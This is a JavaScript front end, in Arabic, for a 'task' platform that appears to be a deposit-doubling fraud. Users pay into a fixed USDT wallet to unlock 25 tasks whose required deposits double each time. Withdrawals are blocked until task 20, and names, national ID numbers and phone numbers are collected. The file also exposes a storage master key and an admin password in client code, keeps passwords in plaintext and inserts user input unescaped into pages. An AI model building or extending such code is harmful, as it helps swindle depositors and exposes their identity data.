// ==== إعداد Bin ====
const BIN_ID = "6924db89d0ea881f40fde913";
const MASTER_KEY = "$2a$10$/t1IpK/lNiB1ZETNBs/YAeUJoTPK/iC9Q1Mm60zlKCH7OdbWCSti.";
const API_URL = `https://api.jsonbin.io/v3/b/${BIN_ID}`;

// ==== بيانات التطبيق ====
let currentUser = JSON.parse(localStorage.getItem("taskUser")) || null;
let adminPassword = "aalmwt10";

// ==== قراءة البيانات من Bin ====
async function readData() {
  const res = await fetch(`${API_URL}/latest`, {
    method: "GET",
    headers: {
      "X-Master-Key": MASTER_KEY,
      "Content-Type": "application/json"
    }
  });
  const data = await res.json();
  if (!data.record.users) data.record.users = [];
  if (!data.record.tasks) {
    data.record.tasks = Array.from({length:25}, (_,i)=>({id:i+1, deposit:0, reward:20*(2**i)}));
  }
  if (!data.record.transactions) data.record.transactions = [];
  return data.record;
}

// ==== تحديث البيانات في Bin ====
async function updateData(newData) {
  await fetch(API_URL, {
    method: "PUT",
    headers: {
      "X-Master-Key": MASTER_KEY,
      "Content-Type": "application/json"
    },
    body: JSON.stringify(newData)
  });
}

// ==== عرض الهيدر ====
function showHeader(show) {
  document.getElementById("header").style.display = show ? "flex" : "none";
}

// ==== تسجيل حساب جديد ====
async function registerPage() {
  showHeader(false);
  document.getElementById("app").innerHTML = `
  <div class="container"><div class="box">
  <h2 style="text-align:center;">إنشاء حساب جديد</h2>
  <input id="regName" placeholder="الاسم الكامل">
  <input id="regEmail" type="email" placeholder="البريد الإلكتروني">
  <input id="regNID" placeholder="الرقم الوطني">
  <input id="regPhone" placeholder="رقم الهاتف">
  <select id="regCountry">
    <option value="+963">🇸🇾 سوريا +963</option>
    <option value="+20">🇪🇬 مصر +20</option>
    <option value="+971">🇦🇪 الإمارات +971</option>
    <option value="+90">🇹🇷 تركيا +90</option>
  </select>
  <input id="regPass" type="password" placeholder="كلمة المرور">
  <button onclick="register()">تسجيل</button>
  <button onclick="loginPage()" style="background:#444;color:white;">رجوع</button>
  </div></div>`;
}

async function register() {
  let name = document.getElementById("regName").value;
  let email = document.getElementById("regEmail").value;
  let nid = document.getElementById("regNID").value;
  let phone = document.getElementById("regPhone").value;
  let country = document.getElementById("regCountry").value;
  let pass = document.getElementById("regPass").value;

  if (!name || !email || !nid || !phone || !pass) { alert("يرجى ملء جميع الحقول"); return; }

  let data = await readData();
  if (data.users.find(u => u.email === email)) { alert("البريد موجود بالفعل"); return; }

  currentUser = {
    id: data.users.length + 1,
    name, email, nid, phone, country, pass,
    balance: 0,
    tasksCompleted: 0,
    taskDeposits: Array(25).fill(0),
    depositRequests: [],
    withdrawRequests: []
  };
  data.users.push(currentUser);
  await updateData(data);
  localStorage.setItem("taskUser", JSON.stringify(currentUser));
  homePage();
}

// ==== تسجيل الدخول ====
async function loginPage() {
  showHeader(false);
  document.getElementById("app").innerHTML = `
  <div class="container"><div class="box">
  <h2 style="text-align:center;">تسجيل الدخول</h2>
  <input id="loginEmail" type="email" placeholder="البريد الإلكتروني">
  <input id="loginPass" type="password" placeholder="كلمة المرور">
  <button onclick="login()">تسجيل الدخول</button>
  <button onclick="registerPage()" style="background:#444;color:white;">إنشاء حساب</button>
  </div></div>`;
}

async function login() {
  let email = document.getElementById("loginEmail").value;
  let pass = document.getElementById("loginPass").value;

  let data = await readData();
  let user = data.users.find(u => u.email === email && u.pass === pass);
  if (!user) { alert("بيانات غير صحيحة"); return; }

  currentUser = user;
  localStorage.setItem("taskUser", JSON.stringify(currentUser));
  homePage();
}

// ==== الصفحة الرئيسية والمهام ====
async function homePage() {
  showHeader(true);
  let data = await readData();
  let tasksHtml = "";
  let depositAmount = 10;
  let reward = 20;

  for (let i = 0; i < 25; i++) {
    let locked = currentUser.taskDeposits[i] < depositAmount || currentUser.tasksCompleted < i;
    let completed = currentUser.tasksCompleted > i;
    tasksHtml += `
      <div class="task ${locked ? 'locked' : ''}">
        <i class="fa-solid fa-rocket"></i>
        <div class="task-content">
          <h3>المهمة رقم ${i + 1}</h3>
          <p>الإيداع المطلوب: <b>${depositAmount}$</b></p>
          <p>الربح عند الإنجاز: <b>${reward}$</b></p>
          <p>الحالة: <b>${completed ? 'تم الإنجاز' : locked ? 'مقفلة' : 'جاهزة'}</b></p>
          <button onclick="openTask(${i},${depositAmount},${reward})" ${locked || completed ? 'disabled' : ''}>تنفيذ المهمة</button>
        </div>
      </div>`;
    depositAmount *= 2; reward *= 2;
  }

  document.getElementById("app").innerHTML = `
  <div class="container">
    <h2>مرحبا ${currentUser.name} | رصيدك: ${currentUser.balance}$</h2>
    ${tasksHtml}
  </div>`;

  document.getElementById("balanceDisplay").innerText = currentUser.balance;
}

// ==== فتح المهمة ====
function openTask(index, dep, rew) {
  document.getElementById("app").innerHTML = `
  <div class="container">
    <div class="box">
      <h2>المهمة رقم ${index + 1}</h2>
      <p>المطلوب قبل التنفيذ: إيداع ${dep}$</p>
      <p>ربحك بعد الإنجاز: ${rew}$</p>
      <button onclick="checkDeposit(${index},${dep},${rew})">تنفيذ المهمة</button>
      <button class="back-btn" onclick="homePage()">رجوع</button>
    </div>
  </div>`;
}

// ==== تنفيذ المهمة ====
async function checkDeposit(index, dep, rew) {
  if (currentUser.taskDeposits[index] < dep) {
    alert(`❌ لا يمكن تنفيذ المهمة بدون إيداع ${dep}$`);
    return;
  }
  currentUser.balance += rew;
  currentUser.tasksCompleted = Math.max(currentUser.tasksCompleted, index + 1);

  let data = await readData();
  let userIndex = data.users.findIndex(u => u.id === currentUser.id);
  if (userIndex !== -1) {
    data.users[userIndex] = currentUser;
    data.transactions.push({
      id: data.transactions.length + 1,
      user_id: currentUser.id,
      type: "task",
      amount: rew,
      date: new Date().toISOString()
    });
    await updateData(data);
  }

  localStorage.setItem("taskUser", JSON.stringify(currentUser));
  alert("✅ تم تنفيذ المهمة وتم إضافة الأرباح!");
  homePage();
}

// ==== صفحة الإيداع ====
async function depositPage() {
  showHeader(true);
  document.getElementById("app").innerHTML = `
  <div class="container">
    <div class="box">
      <h2>إيداع الأموال</h2>
      <p>لإضافة رصيد، يرجى تحويل المبلغ إلى المحفظة التالية:</p>
      <p style="font-weight:bold;">USDT TRC20: <span style="color:#ff416c;">TQi3mspeUBS1Y4NknPu4zZVFiFG2JU5MkX</span></p>
      <input id="depositAmount" type="number" placeholder="المبلغ الذي حولته">
      <input id="depositImage" type="file" accept="image/*">
      <button onclick="submitDeposit()">تقديم طلب الإيداع</button>
      <button class="back-btn" onclick="homePage()">رجوع</button>
    </div>
  </div>`;
}

// ==== تقديم طلب الإيداع ====
async function submitDeposit() {
  let amount = parseFloat(document.getElementById("depositAmount").value);
  let imageFile = document.getElementById("depositImage")?.files[0];

  if (!amount || amount <= 0) { alert("يرجى إدخال مبلغ صحيح"); return; }
  if (!imageFile) { alert("يرجى رفع صورة الإيداع"); return; }

  let reader = new FileReader();
  reader.onload = async function() {
    currentUser.depositRequests.push({
      amount,
      image: reader.result,
      date: new Date().toLocaleString()
    });

    let data = await readData();
    let userIndex = data.users.findIndex(u => u.id === currentUser.id);
    if (userIndex !== -1) {
      data.users[userIndex] = currentUser;
      await updateData(data);
    }

    localStorage.setItem("taskUser", JSON.stringify(currentUser));
    alert("✅ تم إرسال طلب الإيداع للموافقة عليه من قبل الإدارة");
    homePage();
  }
  reader.readAsDataURL(imageFile);
}

// ==== لوحة الإدارة ====
async function adminLogin() {
  let pwd = prompt("ادخل كلمة مرور الادمن:");
  if (pwd !== adminPassword) { alert("كلمة مرور خاطئة"); return; }

  showHeader(true);
  let data = await readData();
  let requestsHtml = "";

  data.users.forEach(u => {
    u.depositRequests.forEach((r, i) => {
      requestsHtml += `
      <div class="admin-request">
        <p><b>المستخدم:</b> ${u.name} | ${u.email}</p>
        <p><b>المبلغ:</b> ${r.amount}$ | التاريخ: ${r.date}</p>
        <img src="${r.image}" alt="صورة الإيداع" style="max-width:200px;display:block;margin:10px 0;">
        <div style="display:flex;gap:10px;margin-bottom:20px;">
          <button onclick="approveDeposit('${u.email}',${i})">✅ قبول</button>
          <button class="reject" onclick="rejectDeposit('${u.email}',${i})">❌ رفض</button>
        </div>
      </div>`;
    });
  });

  if (!requestsHtml) requestsHtml = "<p>لا توجد طلبات إيداع حالياً</p>";

  document.getElementById("app").innerHTML = `
  <div class="container">
    <div class="admin-box">
      <h2>طلبات الإيداع</h2>
      ${requestsHtml}
      <button class="back-btn" onclick="homePage()">رجوع</button>
    </div>
  </div>`;
}

// ==== قبول/رفض طلب الإيداع ====
async function approveDeposit(email, index) {
  let data = await readData();
  let user = data.users.find(u => u.email === email);
  if (!user) return;
  let req = user.depositRequests[index];
  let nextTask = user.tasksCompleted;
  if (nextTask < 25) user.taskDeposits[nextTask] += req.amount;
  user.balance += req.amount;

  user.depositRequests.splice(index,1);
  await updateData(data);

  if (currentUser && currentUser.email === email) currentUser = user;
  localStorage.setItem("taskUser", JSON.stringify(currentUser));
  adminLogin();
}

async function rejectDeposit(email, index) {
  let data = await readData();
  let user = data.users.find(u => u.email === email);
  if (!user) return;

  user.depositRequests.splice(index,1);
  await updateData(data);
  adminLogin();
}

// ==== صفحة السحب ====
async function withdrawPage() {
  showHeader(true);
  if (currentUser.tasksCompleted < 20) { alert("❌ لا يمكن السحب قبل المهمة 20"); return; }

  document.getElementById("app").innerHTML = `
  <div class="container">
    <div class="box">
      <h2>سحب الأموال</h2>
      <p>رصيدك الحالي: ${currentUser.balance}$</p>
      <input id="withdrawWallet" placeholder="أدخل محفظتك">
      <input id="withdrawAmount" type="number" placeholder="المبلغ المراد سحبه">
      <button onclick="submitWithdraw()">طلب سحب</button>
      <button class="back-btn" onclick="homePage()">رجوع</button>
    </div>
  </div>`;
}

// ==== تنفيذ السحب ====
async function submitWithdraw() {
  let wallet = document.getElementById("withdrawWallet").value;
  let amount = parseFloat(document.getElementById("withdrawAmount").value);
  if (!wallet || !amount || amount <= 0) { alert("يرجى إدخال المحفظة والمبلغ الصحيح"); return; }
  if (currentUser.balance < amount) { alert("❌ الرصيد غير كافي"); return; }

  currentUser.balance -= amount;

  let data = await readData();
  let userIndex = data.users.findIndex(u => u.id === currentUser.id);
  if (userIndex !== -1) {
    data.users[userIndex] = currentUser;
    data.transactions.push({
      id: data.transactions.length + 1,
      user_id: currentUser.id,
      type: "withdraw",
      amount,
      wallet,
      date: new Date().toISOString()
    });
    await updateData(data);
  }

  localStorage.setItem("taskUser", JSON.stringify(currentUser));
  alert(`✅ تم سحب ${amount}$ بنجاح`);
  homePage();
}

// ==== حساب المستخدم ====
async function accountPage() {
  showHeader(true);
  document.getElementById("app").innerHTML = `
  <div class="container">
    <div class="box">
      <h2>حسابك الشخصي</h2>
      <p><b>الاسم:</b> ${currentUser.name}</p>
      <p><b>البريد الإلكتروني:</b> ${currentUser.email}</p>
      <p><b>الهاتف:</b> ${currentUser.phone}</p>
      <p><b>الرقم الوطني:</b> ${currentUser.nid}</p>
      <p><b>الدولة:</b> ${currentUser.country}</p>
      <p><b>الرصيد الحالي:</b> ${currentUser.balance}$</p>
      <p><b>المهام المنجزة:</b> ${currentUser.tasksCompleted} من 25</p>
      <button onclick="homePage()">رجوع</button>
    </div>
  </div>`;
}

// ==== تسجيل الخروج ====
function logout() { 
  currentUser = null; 
  localStorage.removeItem("taskUser");
  showHeader(false); 
  loginPage(); 
}

// ==== بدء التطبيق وحفظ الجلسة ====
(async function initApp() {
  let data = await readData();
  if (currentUser) {
    let user = data.users.find(u => u.email === currentUser.email);
    if (user) currentUser = user;
    homePage();
  } else {
    loginPage();
  }
})();
